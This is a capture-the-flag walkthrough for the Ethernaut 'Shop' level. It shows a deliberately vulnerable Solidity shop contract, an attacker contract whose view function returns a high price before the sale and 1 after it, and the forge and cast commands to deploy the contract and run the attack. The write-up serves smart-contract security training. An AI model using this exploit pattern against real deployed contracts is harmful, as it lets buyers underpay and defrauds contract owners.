## Shop Level Outline

**Difficulty : 4/10**

Сan you get the item from the shop for less than the price asked?

```solidity  
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```

[Link to level on Ethernaut](https://ethernaut.openzeppelin.com/level/0x3aCd4766f1769940cA010a907b3C8dEbCe0bd4aB)

## Solution

Simmilar solution to level 11_Elevator. We need to make a function that returns two different values the first and second time that it is called.

Functions with the **view modifier** cannot modify state so we need to monitor the Shop contract for when the boolean `isSold` changes and return a different value based on when it equals true or false.

### Walkthrough

##### 1. Create a new [forge project](https://book.getfoundry.sh/projects/creating-a-new-project.html) with the following contract in `src` 
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Buyer {
    Shop shop;

    constructor(address _shop) {
        shop = Shop(_shop);
    }

    function attack() public {
        shop.buy();
    }

    function price() external view returns (uint) {
        return shop.isSold() ? 1 : 100;
    }
}

interface Shop {
    function isSold() external view returns (bool);
    function buy() external;
}
```

##### 2. Deploy our new contract
```console
forge create src/Contract.sol:Buyer --constructor-args $LEVEL_ADDRESS --private-key  $PRIVATE_KEY
```

##### 3. Call our newly deployed contract 
```console
cast send $DEPLOYED_ADDRESS "attack()" --gas 90000 --private-key=$PRIVATE_KEY 
```
> Replace $DEPLOYED_ADDRESS with the address of your deployed contract


---

##### [:arrow_left: Back To Main Menu](../README.md)
